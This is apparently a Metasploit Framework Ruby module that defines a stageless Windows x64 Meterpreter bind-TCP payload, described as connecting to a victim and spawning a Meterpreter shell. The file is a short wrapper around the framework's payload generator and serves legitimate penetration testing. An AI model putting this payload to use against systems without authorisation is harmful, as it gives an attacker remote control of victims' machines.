##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/windows/x64/stageless_meterpreter'
require 'msf/base/sessions/meterpreter_x64_win'
require 'msf/base/sessions/meterpreter_options'

module Metasploit4

  CachedSize = :dynamic

  include Msf::Payload::Windows::StagelessMeterpreter_x64
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Windows Meterpreter Shell, Bind TCP Inline (x64)',
      'Description' => 'Connect to victim and spawn a Meterpreter shell',
      'Author'      => [ 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::BindTcp,
      'Session'     => Msf::Sessions::Meterpreter_x64_Win
      ))

    register_options([
      OptString.new('EXTENSIONS', [false, "Comma-separate list of extensions to load"]),
    ], self.class)
  end

  def generate
    # blank LHOST indicates bind payload
    url = "tcp://:#{datastore['LPORT']}"
    generate_stageless_x64(url)
  end

end


